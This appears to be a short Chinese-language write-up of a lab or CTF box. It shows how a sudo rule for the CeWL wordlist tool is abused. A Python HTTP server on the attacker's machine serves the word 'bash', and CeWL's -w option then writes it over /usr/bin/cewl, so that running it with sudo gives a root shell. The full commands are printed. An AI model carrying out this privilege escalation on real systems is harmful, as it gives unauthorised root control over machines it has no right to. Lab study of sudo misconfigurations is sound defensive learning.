日常权限检查发现猫腻，搜了一圈cewl提权没结果，查看wp简直被吓坏了

用cewl的工具特性来进行提权，实在高

关于cewl，谷歌一下不难知道他是一种密码生成工具，可以根据爬取的网页来生成密码到指定目录

所以我们本地可以准备起一个python服务，然后内容为bash四个字，由于其他的路径没有写入权限，我们可以利用cewl把python服务的bash写入到cewl中，然后就可以进行提权

┌──(root㉿kali)-[/home/test]
└─# echo 'bash'>a
                                                                                                                                        
┌──(root㉿kali)-[/home/test]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

dashamao@Combine:~$ sudo /usr/bin/cewl http://192.168.56.106/a -w /usr/bin/cewl
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

然后bash就被写入了cewl

最后我们只需要

sudo /usr/bin/cewl

即可提权到root
